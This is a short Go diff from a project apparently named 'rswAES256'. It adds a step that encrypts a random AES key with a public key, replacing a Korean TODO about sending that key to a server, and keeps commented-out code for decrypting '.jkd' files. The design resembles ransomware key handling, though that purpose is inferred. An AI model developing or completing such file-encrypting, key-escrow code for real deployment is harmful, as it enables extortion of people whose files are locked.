@@ -6,6 +6,7 @@ import (
 	"log"
 	"rswAES256/client"
 	"rswAES256/config"
+	"rswAES256/encrypt"
 )
 
 var path = "./config.toml"
@@ -40,8 +41,12 @@ func main() {
 		log.Fatalln(err)
 	}
 
-	//todo 공개키로 난수 키를 암호화 후 서버로 전달.
-
+	//공개키로 난수 키를 암호화 후 서버로 전달.
+	cipherText, err := encrypt.EncryptRandomKeyWithPublicKey(key, publicKey)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	fmt.Println("cipherText:", cipherText)
 	// rootPath의 하위 파일들을 복호화(확장자가.jkd으로 암호화된것만 복호화)
 	//err = newClient.AESDecryptDirectory("./test/")
 	//if err != nil {
